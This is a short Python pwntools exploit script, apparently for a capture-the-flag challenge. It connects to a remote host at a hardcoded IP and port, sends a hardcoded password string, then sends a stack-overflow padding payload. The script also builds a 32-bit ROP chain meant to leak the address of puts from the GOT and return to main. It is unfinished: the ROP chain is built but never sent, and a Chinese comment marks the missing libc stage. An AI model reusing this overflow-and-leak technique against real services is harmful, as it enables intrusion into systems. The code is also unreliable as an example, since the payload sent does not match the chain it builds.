from pwn import *

#io = process('./chall')
elf = ELF('./chall')
io = remote('47.108.29.107',10456)
context.log_level = 'debug'
puts_plt = 0x000104AC
puts_got = 0x2101C
main_addr = 0x00010B6C

io.recvuntil(b'>')
#buf = b's1mpl3Dec0d4r'
buf = b's1mpl3Dec0d4r'
io.sendline(buf)

io.recvuntil(b'>')
payload = b'a'*0x2c + b'b' *4
rop = payload + p32(puts_plt) + p32(puts_got) + p32(main_addr)
io.send(payload)

# 接libc


io.interactive()
